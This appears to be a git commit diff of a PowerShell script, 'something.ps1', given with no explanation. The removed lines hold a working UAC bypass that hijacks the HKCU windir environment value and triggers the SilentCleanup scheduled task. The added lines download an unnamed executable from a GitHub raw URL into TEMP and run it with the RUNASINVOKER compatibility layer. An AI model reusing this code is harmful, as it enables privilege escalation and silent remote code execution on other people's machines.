0c0731ddbaeafbb8b79220144be4f7090f7d60db
IncsecRishie <155700814+IncsecRishie@users.noreply.github.com>
2024-05-31 13:42:31 +1000

    Update something.ps1

--- something.ps1
+++ something.ps1
@@ -1,13 +1,8 @@
-if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
-    # Download and execute the executable file
-    Invoke-WebRequest -Uri "https://www.battoexeconverter.com/downloads/advbattoexeconverter.exe" -OutFile "$env:TEMP\advbattoexeconverter.exe"
-    Start-Process "$env:TEMP\advbattoexeconverter.exe"
-} else {
-    $registryPath = "HKCU:\Environment"
-    $Name = "windir"
-    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
-    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
-    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
-    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
-    Remove-ItemProperty -Path $registryPath -Name $name
-}
+# Download the executable file
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/something.exe" -OutFile "$env:TEMP\something.exe"
+
+# Set the compatibility layer
+$env:__COMPAT_LAYER = "RUNASINVOKER"
+
+# Execute the downloaded executable file
+Start-Process "$env:TEMP\something.exe"
